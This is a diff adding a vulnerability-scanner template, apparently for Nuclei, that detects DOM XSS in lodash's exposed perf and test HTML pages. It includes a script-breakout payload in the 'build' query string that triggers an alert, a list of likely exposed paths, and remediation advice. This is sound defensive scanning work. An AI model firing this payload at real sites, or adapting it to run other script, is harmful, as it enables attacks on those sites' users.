@@ -1,0 +1,66 @@
+id: lodash-perf-test-html-xss-headless
+
+info:
+  name: Lodash perf/test HTML - DOM XSS via query build/other/loader
+  author: Van-1337
+  severity: medium
+  description: |
+    Confirms DOM XSS in lodash perf/index.html and test/index.html. perf-ui.js /
+    test-ui.js take build (and other/loader) from location.search and the HTML
+    page document.write's them as a script src. A breakout payload in the query
+    executes in the hosting origin. No CVE on lodash; still in 4.17.21 / 4.18.1 / main.
+  impact: |
+    A crafted link to the exposed page runs arbitrary JavaScript as that origin.
+  remediation: |
+    Remove perf/ and test/ from the public web root. Do not rely on lodash PR 6230:
+    it only rejects absolute URLs and does not encode document.write.
+  reference:
+    - https://github.com/lodash/lodash/blob/4.17.21/perf/asset/perf-ui.js
+    - https://github.com/lodash/lodash/blob/4.17.21/perf/index.html
+    - https://github.com/lodash/lodash/pull/6230
+    - https://hackerone.com/reports/248560
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-10790
+  classification:
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 12
+  tags: headless,xss,dom-xss,lodash,vuln
+
+variables:
+  xss_mark: "1337"
+
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}{{page}}?build=%22%3E%3C/script%3E%3Cscript%3Ealert({{xss_mark}})%3C/script%3E"
+        action: navigate
+
+      - args:
+          max-duration: 8s
+        action: waitdialog
+        name: lodash_perf_xss
+
+    payloads:
+      page:
+        - "/perf/index.html"
+        - "/lodash/perf/index.html"
+        - "/bower_components/lodash/perf/index.html"
+        - "/assets/bower_components/lodash/perf/index.html"
+        - "/js/vendor/lodash/perf/index.html"
+        - "/vendor/lodash/perf/index.html"
+        - "/node_modules/lodash/perf/index.html"
+        - "/test/index.html"
+        - "/lodash/test/index.html"
+        - "/bower_components/lodash/test/index.html"
+        - "/js/vendor/lodash/test/index.html"
+        - "/vendor/lodash/test/index.html"
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - lodash_perf_xss == true
+          - lodash_perf_xss_message == xss_mark
+        condition: and
